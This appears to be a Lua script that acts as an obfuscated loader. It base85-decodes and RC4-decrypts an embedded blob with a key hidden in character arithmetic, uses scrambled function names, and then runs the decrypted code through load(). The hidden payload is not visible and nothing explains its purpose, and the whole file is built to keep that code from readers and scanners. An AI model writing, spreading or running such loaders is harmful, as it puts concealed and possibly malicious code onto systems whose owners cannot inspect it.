local pb_str = "zp9E|Gdh9cYxI~M4)<KziT3xIMlF(o(8Y<n5L4L^u5_v$3GS&7Iqm{eBuAJe^neXmczwhYWw12A27I}p3-7fr;)YzqXaV1&XCkzn%<;I-VGD31Fs9H5cdCFPbL22Y-0&O`y8s=P_X;ekCoQ+$%5bJzP%9n"

local CteEDxul = string.char(98-31,144-37,97-15,79+30,71-16,23+42,128-21,52+17,149-45,141-21,57+25,38+36,142-33,20+29,32+42,49+31,54+24,102-15,54+44,82+16,85-29,48+23,27+25,140-18,65+16,35+39,80-32,69+35,128-28,78+23,50+15,136-26)
local function ARsShZMv(a,b)
    local p,c=1,0
    while a>0 and b>0 do
        local ra,rb=a%2,b%2
        if ra~=rb then c=c+p end
        a,b,p=(a-ra)/2,(b-rb)/2,p*2
    end
    if a<b then a=b end
    while a>0 do
        local ra=a%2 if ra>0 then c=c+p end a,p=(a-ra)/2,p*2
    end
    return c
end
local function cXUTQjCi(s)
    local m,o,p,v,n,c={},{},{52200625,614125,7225,85,1},0,0,"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)]=i-1 end
    for i=1,#s do
        local x=m[string.byte(s,i)]
        if x then
            v=v+x*p[n+1] n=n+1
            if n==5 then
                table.insert(o,string.char(math.floor(v/16777216),math.floor((v%16777216)/65536),math.floor((v%65536)/256),v%256))
                v,n=0,0
            end
        end
    end
    return table.concat(o)
end
local function cNiTnvRX(d,k)
    local s={} for i=0,255 do s[i]=i end
    local j=0
    for i=0,255 do j=(j+s[i]+string.byte(k,(i%#k)+1))%256 s[i],s[j]=s[j],s[i] end
    local i,out=0,{} j=0
    for idx=1,#d do
        i=(i+1)%256 j=(j+s[i])%256 s[i],s[j]=s[j],s[i]
        out[#out+1]=string.char(ARsShZMv(string.byte(d,idx),s[(s[i]+s[j])%256]))
    end
    return table.concat(out)
end
local p_data = cNiTnvRX(cXUTQjCi(pb_str), CteEDxul)
assert(load(p_data))()
